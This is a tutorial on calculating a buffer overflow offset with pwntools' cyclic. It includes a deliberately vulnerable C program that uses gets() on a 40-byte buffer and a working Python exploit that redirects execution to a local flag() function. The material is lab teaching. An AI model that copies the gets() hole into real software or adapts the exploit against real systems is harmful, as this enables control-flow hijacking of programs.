## **Offset Calculation in Buffer Overflow Exploits with Cyclic**

### **Overview**

In this document, we demonstrate how to calculate the **offset** in a **buffer overflow** vulnerability using `cyclic` from the **pwntools** library. This process involves generating a cyclic pattern, sending it to the vulnerable program, and then analyzing the core dump to identify where the return address is overwritten. Once the offset is determined, we can exploit the vulnerability by overwriting the return address with the address of a malicious function.

### **Vulnerable Program Example**
```c
#include <stdio.h>

void unsafe() {
    char buffer[40];
    
    puts("Overflow me");
    gets(buffer);  // Vulnerable to buffer overflow
}

void main() {
    unsafe();
}

void flag() {
    puts("Exploited!!!!!");
}
```

### **Exploit Process**

1. **Generate Cyclic Pattern**:
   - The first step in exploiting a buffer overflow is to determine the offset where the return address gets overwritten. We do this by generating a cyclic pattern larger than the buffer size (in this case, the buffer is 40 bytes). This pattern will be used to overwrite the return address.

2. **Send Cyclic Pattern to Program**:
   - Once the pattern is generated, we send it to the vulnerable program. The program will crash after overwriting the return address with a portion of the cyclic pattern.

3. **Analyze Core Dump and Find Offset**:
   - After the program crashes, we analyze the **core dump** to inspect the **EIP** (Extended Instruction Pointer). Using `cyclic_find()`, we can pinpoint where the cyclic pattern begins to overwrite the return address, which gives us the exact **offset**.

4. **Construct Exploit Payload**:
   - After determining the offset, we craft the payload. The payload consists of the cyclic pattern up to the offset, followed by the address of the `flag()` function, which we want to execute when the buffer overflow occurs.

5. **Run the Exploit**:
   - Finally, we send the crafted payload to the vulnerable program, causing it to jump to the `flag()` function and print `"Exploited!!!!!"`.

### **Exploit Code**

```python
from pwn import *

# Setup context
context.binary = './vuln'
context.terminal = ['tmux', 'splitw', '-h']

# Load binary
elf = ELF('./vuln')

# Step 1: Generate a cyclic pattern to determine the offset
p = process('./vuln')
cyclic_pattern = cyclic(100)  # Generate a pattern larger than the buffer size
print(p.recvline().decode())  # Receive initial output
p.sendline(cyclic_pattern)  # Send the cyclic pattern
p.wait()  # Wait for the program to crash
core = p.corefile  # Extract core dump

# Step 2: Find the offset where the EIP is overwritten using cyclic_find
eip_offset = cyclic_find(core.eip)  # Find the offset based on core dump's EIP value
log.info(f"Offset to EIP: {eip_offset}")

# Step 3: Construct the final exploit payload
flag_addr = elf.symbols['flag']  # Address of the flag function

# Payload
payload = b'A' * eip_offset  # Fill up to the return address
payload += p32(flag_addr)  # Overwrite EIP with the flag function's address

# Step 4: Run the exploit with the correct payload
p = process('./vuln')
print(p.recvline().decode())  # Receive initial output
p.sendline(payload)  # Send the payload
p.interactive()  # Get interactive shell to verify the exploit
```

### **Explanation of Code**

1. **Cyclic Pattern Generation**:
   - The `cyclic(100)` generates a cyclic pattern with a size of 100 bytes. This is larger than the buffer (which is 40 bytes) and will ensure that the return address gets overwritten with part of the pattern.

2. **Crash and Core Dump Analysis**:
   - After sending the cyclic pattern, the program crashes. We use the `corefile` to examine the crash and find the EIP value. The `cyclic_find()` function helps us find the exact offset where the pattern starts in the EIP.

3. **Payload Construction**:
   - Once the offset is found, we construct the payload by filling the buffer with `A` characters up to the offset. Then, we append the address of the `flag` function to redirect the program’s execution to it.

4. **Final Exploit Execution**:
   - The payload is sent to the program, which causes the program to jump to the `flag` function and execute the payload, printing `"Exploited!!!!!"`.

### **Final Thoughts**

This method of calculating the offset is one of the fundamental techniques used in buffer overflow exploits. The cyclic pattern helps in pinpointing the exact location where the buffer overflow overwrites the return address, enabling an attacker to hijack the program’s control flow.